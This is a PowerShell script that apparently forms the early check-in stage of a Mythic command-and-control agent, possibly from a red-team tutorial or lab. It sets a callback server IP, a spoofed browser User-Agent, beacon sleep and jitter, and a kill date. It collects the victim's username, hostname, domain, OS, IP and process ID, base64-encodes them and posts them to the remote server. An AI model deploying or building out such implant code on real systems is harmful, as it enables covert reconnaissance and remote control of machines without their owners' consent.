# Create agent object to track configuration
$Agent = [pscustomobject]@{
    Server = "http://172.16.99.133"
    Port = "80"
    URI = "/index.html"
    PayloadUUID = ""
    UUID = ""
    UserAgent = "Mozilla/5.0 (Windows NT 6.3; Trident/7.0; rv:11.0) like Gecko"
    HostHeader = ""
    Sleep = 5
    Jitter = 20
    KillDate = "2021-11-04"
    Script = ""
}

###
# Utility functions
###

# get process architecture
function Get-Arch {
    if([IntPtr]::Size -eq 8) {
        return "x64"
    }
    else {
        return "x86"
    }
}

###
# Web request functions
###

# send data to Mythic server with POST request
function Post-Request {
    param([string] $data)

    # Create WebClient object
    $wc = [System.Net.WebClient]::New()

    # Add our request headers
    $wc.Headers.Add("User-Agent", $Agent.UserAgent)
    if ($Agent.HostHeader -ne "") {
        $wc.Headers.Add("Host", $Agent.HostHeader)
    }

    # Attempt to send data to Mythic, if it fails or the data is not a tasking message just return nothing
    try {
        $result = $wc.UploadString($Agent.server + $Agent.URI, $data)
        return $result
    }
    catch {
        return ""
    }
}

###
# HTTP profile functions
###

# collect checkin data, send data to Mythic server, and process results
function Send-Checkin {
    # Gather checkin data into custom PowerShell object and convert to JSON
    $reg = Get-ItemProperty -Path 'HKLM:\Software\Microsoft\Windows NT\CurrentVersion'
    $data = [pscustomobject]@{
        action = "checkin"
        ip = (Test-Connection -ComputerName $env:computername -Count 1).IPV4Address.IPAddressToString
        os = "$($reg.Productname) $($reg.ReleaseId)"
        user = $env:username
        host = $env:computername
        domain = $env:userdomainname
        pid = [System.Diagnostics.Process]::GetCurrentProcess().Id
        uuid = $Agent.PayloadUUID
        architecture = Get-Arch
    } | ConvertTo-Json

    # Display checkin data
    Write-Host "Checkin Data:"`n$data`n

    # Base64 checkin message
    $encoded_data = [System.Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes("$($Agent.PayloadUUID)$($data)"))
    
    # Send checkin data to Mythic server
    $response = Post-Request -data $encoded_data

    # Decode response data
    $decoded_data = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($response)).substring(36)

    # Display response data
    Write-Host "Mythic Response:"`n$decoded_data`n

    # Check if Mythic returned data, update UUID and tell Main loop to continue
    $result = $decoded_data | ConvertFrom-Json

    if ($result.status -eq "success") {
        $Agent.UUID = $result.Id
        return $true
    }
    else {
        return $false
    }
}

# Send checkin data
Send-Checkin

# Display agent data
Write-Host "Agent Config:"`n$Agent